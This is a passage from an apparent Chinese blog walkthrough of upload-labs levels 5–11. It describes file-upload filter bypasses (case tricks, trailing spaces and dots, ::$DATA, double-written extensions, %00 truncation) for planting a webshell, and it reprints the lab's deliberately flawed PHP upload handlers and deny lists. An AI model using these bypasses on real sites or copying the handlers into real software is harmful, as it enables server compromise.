class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-5-后缀面大小写绕过"><a href="#Less-5-后缀面大小写绕过" class="headerlink" title="Less-5(后缀面大小写绕过)"></a>Less-5(后缀面大小写绕过)</h1><p>禁止了之前关卡所有的绕过方式，看提示和网上教程，使用文件名后缀大小写方式绕过。但是服务器解析不了？？？，后缀不正常的都解析不了，这个配置是怎么配置的。查看github项目，修改了docker-php.conf的一些东西，发现可以了？？，奇怪得很。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211002162413339.png" alt="github"></p><p>但是如果直接在浏览器的url处输入会把所有的输入变成小写，需要用到hackbar，这下可以解析大小写后缀的东西了。</p><p>注意如果使用文件后缀大小写绕过最好用hackbar，不要直接输入，会将你的输入全部自动变成小写。</p><h1 id="Less-6-Winodws下文件后缀空格绕过"><a href="#Less-6-Winodws下文件后缀空格绕过" class="headerlink" title="Less-6(Winodws下文件后缀空格绕过)"></a>Less-6(Winodws下文件后缀空格绕过)</h1><p>使用空格绕过，源码中少了这个语句，那么就可以使用bp抓包给文件后缀添加空格。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>但是这道题有一个坑，就是我用的是Docker，当文件后缀有空格时在Windows系统下会自动忽略但是Linux不会自动忽略文件末尾的空格，所以就算能够成功上传还是无法解析，最后我发现需要修改一下docker-php.conf文件(如何使用docker命令进入容器shell请自己百度)，用到.htaccess的知识。在文件中添加这样一个语句。这样就可以解析了，问题暂时解决了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php &gt;</span><br><span class="line">        SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>网上的教程基本都是用phpstudy之类的集成环境在windows下搭建的，如果用docker还是有很多坑的，需要自己慢慢去踩，不过还是可以学到一点服务器的东西hhhhh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还是贴下源码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-7-文件后缀点号绕过"><a href="#Less-7-文件后缀点号绕过" class="headerlink" title="Less-7(文件后缀点号绕过)"></a>Less-7(文件后缀点号绕过)</h1><p>这次的源码没有去掉后缀的.号，做法和上面的一样，通过抓包修改文件后缀添加一个.就可以成功上传，具体过程就不说了，贴下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-8-Windows下-DATA文件流绕过"><a href="#Less-8-Windows下-DATA文件流绕过" class="headerlink" title="Less-8(Windows下::$DATA文件流绕过)"></a>Less-8(Windows下::$DATA文件流绕过)</h1><p>这关使用多文件后缀可过，其实之前的几关都可以使用多文件后缀的方式过，但是感觉多文件后缀的方式不好，没有达到作者的意思，通过源码发现这次比之前少了一个检测。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>关于$DATA的知识点：php在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持”<code>::$DATA</code>“之前的文件名 他的目的就是不检查后缀名。</p><p>那么还是就可以通过抓包修改文件后缀的方式来进行绕过，先尝试尝试，发现可以上传，但是在docker中似乎只是单纯的修改了文件名，并没有任何作用</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211002173137199.png"></p><p>感觉这个upload-labs有部分环境都只能是在windows下才能生效，如果在Linux下很多解析规则都不一样了。这就没法做了，先跳过，之后在windows的环境下在做做看</p><h1 id="Less-9-多点空格绕过"><a href="#Less-9-多点空格绕过" class="headerlink" title="Less-9(多点空格绕过)"></a>Less-9(多点空格绕过)</h1><p>这一关也还是可以通过服务器多重解析来绕过，不重点去讲，之前学文件上传的经验基本用完了，看看源码有哪些操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>上面的过滤把之前绕过的方法全部过滤了，看网上的做法是使用空格加点来进行绕过，名称叫<strong>多点空格绕过</strong>。</p><p>首先还是要通过bp抓包，然后修改后缀加空格和点。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003013728352.png" alt="image-20211003013728352"></p><p>由于前面加了空格，所以php只会过滤文件后缀最后的点，上传到服务器上面时后缀就变成了<code>.php.\r</code>，这种后缀的php文件服务器是可以解析的。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003014144032.png" alt="上传文件格式"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-10-正则匹配双写绕过"><a href="#Less-10-正则匹配双写绕过" class="headerlink" title="Less-10(正则匹配双写绕过)"></a>Less-10(正则匹配双写绕过)</h1><p>加入了正则匹配，这关如果了解过sql注入就比较简单，代码逻辑就是将黑名单中的后缀名进行正则匹配，如果匹配成功就替换成空。比如我们上传一个php后缀的文件。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003014923999.png"></p><p>上传到服务器后就变成了如下的样子，由于后缀在黑名单中，所以直接被去掉了。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003015018221.png" alt="image-20211003015018221"></p><p>绕过方法也比较简单，直接双写绕过，因为一般代码中的正则匹配只匹配一次，所以双写一次就可以绕过了。</p><p>这次上传一个文件后缀为.pphphp的php代码文件，在看看服务器上的文件夹是什么样子。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003015239569.png"></p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003015417933.png" alt="服务器上传文件"></p><p>这样就写入webshell了，比较简单的一关，php的真则匹配还是比较好理解的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-11-00截断符绕过-GET方式"><a href="#Less-11-00截断符绕过-GET方式" class="headerlink" title="Less-11(%00截断符绕过-GET方式)"></a>Less-11(%00截断符绕过-GET方式)</h1><p>现在开始白名单时间，之前全都是绕过黑名单，白名单的绕过方法要比黑名单少很多。</p><p>学习的知识点是使用%00去截断，这个漏洞有前提</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）php版本必须小于5.3.4 </span><br><span class="line">（2）打开php的配置文件php-ini，将magic_quotes_gpc设置为Off</span><br></pre></td></tr></table></figure><p>但是我docker上的php版本是5.5.38，已经不满足条件了，只有后面在windows环境下复现或者在去折腾docker（不是很愿意）</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003205500396.png" alt="docker-php版本"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 